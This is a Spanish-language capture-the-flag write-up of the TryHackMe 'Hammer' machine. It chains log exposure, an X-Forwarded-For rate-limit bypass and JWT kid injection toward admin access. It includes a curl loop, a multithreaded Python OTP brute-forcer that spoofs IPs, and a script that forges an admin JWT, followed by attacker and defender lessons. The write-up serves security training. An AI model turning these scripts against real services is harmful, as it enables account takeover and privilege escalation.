Resumen Ejecutivo

Hammer es una máquina Linux de dificultad media en TryHackMe orientada al ataque de aplicaciones web. El compromiso recorre tres vulnerabilidades independientes encadenadas: exposición de logs en un directorio público, bypass del rate limiting mediante la cabecera X-Forwarded-For para forzar un OTP de 4 dígitos, e inyección en el parámetro kid del JWT para forjar un token con role admin y obtener ejecución remota de comandos como www-data.

¿Por qué es interesante?

Tres vulnerabilidades de impacto bajo–medio (log exposure, weak rate limit, JWT misconfig) se combinan en una cadena que termina en RCE. Refleja muy bien escenarios reales: ningún fallo aislado parece crítico, pero la suma compromete por completo la aplicación.

3. Brute force de OTP con bypass de rate limiting

PASO 6 — Análisis del formulario

OTP de 4 dígitos + cabecera Rate-Limit-Pending

¿Qué es un OTP?

Una contraseña de un solo uso que se envía al usuario para verificar identidad. Si tiene pocos dígitos y el rate limit no es robusto, es forzable.

Al enviar el email al endpoint, la respuesta incluye una cabecera muy reveladora:

headers HTTP
HTTP/1.1 302 Found Set-Cookie: PHPSESSID=...; path=/ Rate-Limit-Pending: 9 Location: reset_password.php
¿Qué significa?

El servidor permite máximo 10 intentos por IP. Con 4 dígitos hay 10.000 combinaciones — imposible con 10 intentos. Pero la pregunta clave es: ¿cómo identifica el servidor la IP del cliente?

PASO 7 — Bypass con X-Forwarded-For

Test: ¿se resetea el contador con cada XFF distinto?

¿Qué es X-Forwarded-For?

Cabecera HTTP usada por proxies para indicar al backend la IP original del cliente. Si el servidor confía en ella sin validar el origen, el atacante la falsifica trivialmente.

for i in $(seq 1 12); do XFF="10.0.0.$i" resp=$(curl -s -i -b "PHPSESSID=$SESS" http://10.128.167.188:1337/reset_password.php \ -X POST -d "recovery_code=000$i&s=180" \ -H "X-Forwarded-For: $XFF" | grep "Rate-Limit") echo "Req $i (XFF=$XFF): $resp" done
output
Req 1 (XFF=10.0.0.1): Rate-Limit-Pending: 9 Req 2 (XFF=10.0.0.2): Rate-Limit-Pending: 9 Req 3 (XFF=10.0.0.3): Rate-Limit-Pending: 9 ... Req 12 (XFF=10.0.0.12): Rate-Limit-Pending: 9
¡Rate limit completamente bypasseado!

Cada IP nueva en XFF recibe contador fresco. Cambiando la IP en cada petición podemos lanzar 10.000 intentos sin restricción.

PASO 8 — Brute force multithread del OTP

50 hilos paralelos para entrar en la ventana de 180s

¿Por qué 50 hilos?

El OTP expira en 180 segundos. Con un solo hilo no llegamos a tiempo. Con 50 hilos atacando rangos de 200 códigos, cubrimos las 10.000 combinaciones en ~20–30 segundos.

#!/usr/bin/env python3
import requests, random, threading

TARGET = "http://10.128.167.188:1337/reset_password.php"
stop_flag = threading.Event()
session = requests.Session()

# Activar el flujo de reset (1 sola vez, 1 sola sesión)
session.post(TARGET, data={"email": "tester@hammer.thm"},
             headers={"X-Forwarded-For": "1.1.1.1"}, allow_redirects=False)

def brute_range(start, end):
    for code in range(start, end):
        if stop_flag.is_set(): return
        otp = f"{code:04d}"
        # IP aleatoria diferente en cada petición → bypass rate limit
        xff = f"127.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        r = session.post(TARGET,
            data={"recovery_code": otp, "s": "180"},
            headers={"X-Forwarded-For": xff},
            timeout=8, allow_redirects=False)
        if "Invalid or expired recovery code!" not in r.text \
           and "Enter Recovery Code" not in r.text:
            stop_flag.set()
            print(f"[+] OTP ENCONTRADO: {otp}")
            return

# 50 threads, cada uno ataca 200 códigos
threads = [threading.Thread(target=brute_range, args=(i*200, (i+1)*200)) for i in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]
output
[*] Triggering reset... [+] Session: 7c338887u17unk2aqbt4ll3671 [+] OTP ENCONTRADO: 3439 [+] Pass change: 200 | OK
Resultado

OTP encontrado en segundos. Inmediatamente cambiamos la contraseña a Password123!. Ya tenemos credenciales válidas para tester@hammer.thm.

5. JWT kid Injection — Escalada a admin

PASO 10 — Decodificar el JWT

Análisis del parámetro kid

¿Qué es un JWT?

Estándar para transmitir información firmada. Tres partes: header (tipo + algoritmo), payload (datos), signature (firma). Si la firma valida, el servidor confía en el payload.

echo "eyJ0eXAiOi..." | base64 -d
JWT header decodificado
{ "typ": "JWT", "alg": "HS256", "kid": "/var/www/mykey.key" }
JWT payload decodificado
{ "iss": "http://hammer.thm", "aud": "http://hammer.thm", "iat": 1776416845, "exp": 1776420445, "data": { "user_id": 1, "email": "tester@hammer.thm", "role": "user" } }
Hallazgo crítico — el campo kid

kid (Key ID) le dice al servidor qué archivo del filesystem usar como clave HMAC para verificar la firma. Si encontramos un archivo cuyo contenido conozcamos, podemos forjar tokens válidos con cualquier payload.

PASO 11 — Identificar la clave conocida

188ade1.key visible en el dashboard

El listado de archivos del dashboard expone 188ade1.key. Lo leemos a través de la interfaz web:

contenido de 188ade1.key
56058354efb3daa97ebab00fabd7a7d7
Plan

Apuntamos kid a /var/www/html/188ade1.key y firmamos el JWT con 56058354efb3daa97ebab00fabd7a7d7. El servidor leerá ese archivo, validará la firma y aceptará el payload con role: admin.

PASO 12 — Forja del JWT admin

Script Python para construir y firmar el token

¿Por qué funciona?

El servidor confía ciegamente en el kid del cliente. Una implementación segura usaría una clave hardcoded o validaría kid contra un whitelist estricto.

#!/usr/bin/env python3
import json, base64, hmac, hashlib

KEY = "56058354efb3daa97ebab00fabd7a7d7"  # clave conocida

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"  # ← ruta conocida
}

payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": server_iat,    # iat real del servidor
    "exp": server_iat + 3600,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"   # ← escalada
    }
}

h = b64url(json.dumps(header, separators=(',',':')))
p = b64url(json.dumps(payload, separators=(',',':')))
sig = hmac.new(KEY.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
forged_jwt = f"{h}.{p}.{b64url(sig)}"
Nota sobre iat

El servidor exige que iat coincida con el del login activo. Si usamos un timestamp distinto devuelve "Cannot handle token with iat prior to...". Solución: extraer el iat del JWT real y reusarlo.

7. Análisis de vulnerabilidades

Directory Listing + Log Exposure

hmr_logs/ tiene listing habilitado y error.logs expone emails reales, rutas del sistema y fallos históricos sin autenticación.

MEDIUM — CWE-532

Rate Limit Bypass via X-Forwarded-For

El rate limit confía en X-Forwarded-For para identificar al cliente. Como la cabecera la controla el atacante, el control es trivialmente bypasseable.

HIGH — CWE-799

Weak OTP — 4 dígitos sin lockout real

Solo 10.000 combinaciones. Combinado con el bypass de rate limit, se fuerza en segundos con 50 hilos paralelos dentro de la ventana de 180 s.

HIGH — CWE-307

JWT kid Path Traversal / Key Confusion

El servidor acepta kid sin validación, permitiendo apuntar a cualquier archivo del filesystem como clave HMAC. Si su contenido es conocido, se forjan tokens con cualquier role.

CRITICAL — CWE-347

8. Lecciones aprendidas

⚔️ Para el atacante

  • Comentarios HTML en producción revelan convenciones — siempre leer el código fuente completo.
  • Cualquier rate limit por IP: probar X-Forwarded-For, X-Real-IP, X-Client-IP, Forwarded.
  • OTPs cortos son forzables si no hay lockout real. Multithreading es clave.
  • El campo kid del JWT siempre se decodifica y se busca como ruta.
  • Cookies con expiración corta (persistentSession) son control de UX, no de seguridad — el backend valida JWT.
  • El iat puede tener validación servidor — extraer el real y reutilizarlo.

🛡️ Para el defensor

  • Nunca exponer logs públicamente. Options -Indexes y Require all denied.
  • Rate limit a nivel de red (iptables, fail2ban, WAF), nunca confiando en cabeceras del cliente.
  • OTPs de 6+ dígitos con lockout permanente tras N intentos, independiente de la IP.
  • JWT: clave hardcoded en variables de entorno. kid validado contra whitelist estricto, jamás como ruta.
  • Nunca colocar archivos *.key bajo el document root.
  • Eliminar todos los comentarios de desarrollo del HTML antes de producción.
